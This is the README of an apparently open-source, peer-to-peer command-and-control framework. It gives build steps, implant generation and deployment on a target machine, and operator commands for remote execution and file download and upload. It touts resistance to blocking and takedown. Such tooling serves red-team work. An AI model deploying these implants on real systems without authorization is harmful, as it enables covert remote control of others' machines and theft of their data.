# Arachne C2

A decentralized Command & Control framework built on **libp2p** (the peer-to-peer networking
stack behind IPFS). No servers, no domains, no IPs to block — just cryptographic identities
communicating over the global p2p network.

Inspired by [Sliver](https://github.com/BishopFox/sliver), but redesigned for decentralized
infrastructure.

## Key Idea

Instead of running a C2 server on a VPS that can be taken down, Arachne uses **GossipSub
(PubSub)** and **DHT peer discovery** over the IPFS peer-to-peer network. Your implant
fleet and operator are all equal peers in the network — no central point of failure.

## Features

- Beacon-mode implants that maintain presence via PubSub topics
- DHT-based peer discovery — no hardcoded server IPs
- Encrypted and signed messages (Ed25519 + NaCl box)
- Interactive operator console (list, select, exec, ls, ps, cd, pwd, download, upload)
- Cross-platform implants (Linux, macOS, Windows)
- Protocol Buffers message format with per-message signature verification
- Built-in hole punching for NAT traversal

## Project Structure

```
arachne-c2/
├── build.sh                # Build script (auto-installs Go if missing)
├── bin/                    # Compiled binaries
├── cmd/
│   └── build-implant/      # Tool to embed operator pubkey into implant binary
├── docs/                   # Design documentation
├── implant/                # Implant agent code
│   └── core/               # Agent runtime, command handlers
├── pkg/
│   ├── config/             # Shared config types
│   ├── cryptography/       # Ed25519 + NaCl key management
│   └── transport/          # libp2p node, messenger, PubSub helpers
├── protobuf/               # Protocol Buffers definitions
│   ├── arachnepb/          # C2 protocol messages
│   ├── commonpb/           # Common types
│   └── rpcpb/              # RPC service definitions
└── server/                 # Operator node (the "server")
    └── core/               # Operator logic, implant tracking, CLI
```

## Build

Requires Go 1.21+. The build script auto-installs Go if missing:

```bash
./build.sh
```

Or build manually:

```bash
go build -o bin/server ./server/main.go
go build -o bin/implant ./implant/main.go
go build -o bin/build-implant ./cmd/build-implant/main.go
```

## Quick Start

### 1. Run the operator (server)

```bash
./bin/server
```

On first run, generates a keypair at `~/.arachne/operator.key` and exports the public
key to `~/.arachne/operator.pub`.

### 2. Build an implant

Use the build-implant tool to embed the operator's public key:

```bash
./bin/build-implant -pubkey ~/.arachne/operator.pub -output ./myimplant
```

This produces a standalone implant binary at `./myimplant`.

### 3. Deploy and run the implant

Copy `./myimplant` to the target machine and run:

```bash
./myimplant
```

The implant will discover the operator via DHT, register itself, and begin beaconing.

### 4. Use the operator console

From the operator prompt:

```
arachne> list
  0: user@hostname [linux/amd64] last=5s peer=12D3Koo...

arachne> select 0
arachne (user@hostname) > exec whoami
```

Available commands: `list`, `select <n>`, `exec <cmd>`, `ls <path>`, `cd <path>`,
`pwd`, `ps`, `download <path>`, `upload <path>`, `help`, `exit`.

## Security

- All messages are signed with Ed25519 keys
- Implants are built with the operator's public key embedded — they will only accept
  commands from that operator
- Beacon messages use NaCl box encryption for confidentiality
- Peer identity is verified on every message via envelope signatures

## License

GPLv3
